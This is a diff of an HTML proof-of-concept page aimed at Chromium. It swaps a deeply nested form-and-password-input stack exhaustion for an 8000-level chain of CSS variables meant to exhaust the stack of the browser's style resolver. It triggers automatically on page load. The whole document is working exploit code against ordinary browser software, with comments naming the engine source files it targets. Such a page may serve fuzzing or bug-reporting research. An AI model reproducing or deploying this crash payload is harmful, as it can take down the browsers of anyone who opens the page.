@@ -1,31 +1,38 @@
-HTML
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Chromium DOM Stack Exhaustion PoC</title>
+    <title>CSS Stack Clash Fuzzer</title>
+    <style id="fuzzStyle"></style>
 </head>
 <body>
-    <div id="root"></div>
+    <div id="target">Triggering CSS Engine...</div>
+
     <script>
-        function trigger() {
-            let current = document.getElementById('root');
-            for (let i = 0; i < 5000; i++) {
-                let f = document.createElement('form');
-                let input1 = document.createElement('input');
-                input1.type = "text";
-                let input2 = document.createElement('input');
-                input2.type = "password";
-                f.appendChild(input1);
-                f.appendChild(input2);
-                current.appendChild(f);
-                current = f;
+        function triggerCSSClash() {
+            let styleEl = document.getElementById('fuzzStyle');
+            let cssText = ":root { \n";
+            
+            // 1. Build an insanely deep, interdependent CSS variable tree
+            // --var1 relies on --var2, which relies on --var3...
+            let depth = 8000; 
+            for (let i = 0; i < depth; i++) {
+                cssText += `--v${i}: var(--v${i+1}, 1px);\n`;
             }
-            // Force layout recalculation / Autofill parsing
-            let deepInput = current.querySelector('input');
-            if(deepInput) deepInput.focus();
+            cssText += `--v${depth}: 10px; \n}\n`;
+
+            // 2. Force the CSS Parser (css_parser_impl.cc) to parse it
+            styleEl.innerHTML = cssText;
+
+            // 3. Force the Style Resolver (style_resolver.cc) to calculate it
+            // We apply it to a deeply nested calc() to maximize stack frame usage
+            let target = document.getElementById('target');
+            target.style.width = "calc(var(--v0) * 2)";
+            
+            // Force layout calculation
+            let force = target.offsetWidth; 
         }
-        setTimeout(trigger, 500);
+
+        setTimeout(triggerCSSClash, 500);
     </script>
 </body>
 </html>
